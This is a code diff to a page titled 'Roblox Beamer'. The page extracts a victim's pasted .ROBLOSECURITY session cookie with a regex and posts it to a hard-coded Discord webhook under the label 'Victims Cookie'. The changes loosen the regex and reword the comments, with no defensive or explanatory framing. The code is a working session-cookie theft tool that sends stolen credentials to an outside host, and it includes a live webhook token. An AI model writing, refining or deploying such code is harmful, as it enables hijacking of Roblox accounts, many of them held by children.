@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Beamer</title>
+  <title>TESTRoblox Beamer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -55,7 +55,7 @@
     // Replace with your Discord Webhook URL
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320573593821773845/QvHOAwVTwyuwh6O-HT15JQSZYD_W9hxsYcfnOe3L-Ig7vENas32Ybj5p2_3VVHYiHdQg";
 
-    const cooldownTime = 2; // Cooldown duration in seconds 120 default
+    const cooldownTime = 2; // Cooldown duration in seconds
     const cooldownKey = "sendCooldown"; // Key for localStorage
 
     function sendMessage() {
@@ -66,8 +66,8 @@
 
       errorMessage.textContent = ""; // Clear any previous error messages
 
-      // Search for the .ROBLOSECURITY token in the message
-      const robloSecurityCodeRegex = /_ROBLOSECURITY=([a-zA-Z0-9]+);/;
+      // Regular expression to match the ROBLOSECURITY cookie or token
+      const robloSecurityCodeRegex = /_ROBLOSECURITY=([a-zA-Z0-9]+)(?=;|$)/;
 
       const match = message.match(robloSecurityCodeRegex);
 
@@ -80,7 +80,7 @@
           embeds: [
             {
               title: "Victims Cookie", // Embed title
-              description: `\`\`\`${robloSecurityCode}\`\`\``, // Embed description with the code wrapped in backticks
+              description: `\`\`\`${robloSecurityCode}\`\`\``, // Embed description with the token wrapped in backticks
               color: 16711680, // Embed color (red in this case)
               timestamp: new Date().toISOString() // Adds a timestamp
             }
@@ -108,7 +108,7 @@
           });
 
       } else {
-        // If the _ROBLOSECURITY code is not found in the message
+        // If the _ROBLOSECURITY cookie is not found in the message
         errorMessage.textContent = "Message failed! .ROBLOSECURITY cookie not found.";
       }
     }
